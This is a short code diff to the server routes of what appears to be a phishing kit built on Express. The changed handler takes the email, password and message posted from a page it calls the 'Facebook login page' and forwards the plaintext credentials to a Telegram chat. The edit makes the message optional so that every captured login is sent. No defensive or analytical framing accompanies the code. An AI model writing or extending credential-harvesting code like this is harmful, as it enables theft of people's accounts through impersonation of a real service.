@@ -110,12 +110,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const { email, password, message } = req.body;
       
-      if (!message) {
-        return res.status(400).json({ success: false, error: 'Message is required' });
+      // Format the message - always include login info, message is optional
+      let formattedMessage;
+      if (message) {
+        formattedMessage = `Login attempt from the Facebook login page:\n\nUsername/Email: ${email || 'Not provided'}\nPassword: ${password || 'Not provided'}\nMessage: ${message}`;
+      } else {
+        formattedMessage = `Login attempt from the Facebook login page:\n\nUsername/Email: ${email || 'Not provided'}\nPassword: ${password || 'Not provided'}\nNo message provided`;
       }
-      
-      // Format the message
-      const formattedMessage = `Message from the Facebook login page:\n\nUsername/Email: ${email || 'Not provided'}\nPassword: ${password || 'Not provided'}\nMessage: ${message}`;
       
       // Send to Telegram
       const success = await sendTelegramMessage(formattedMessage);
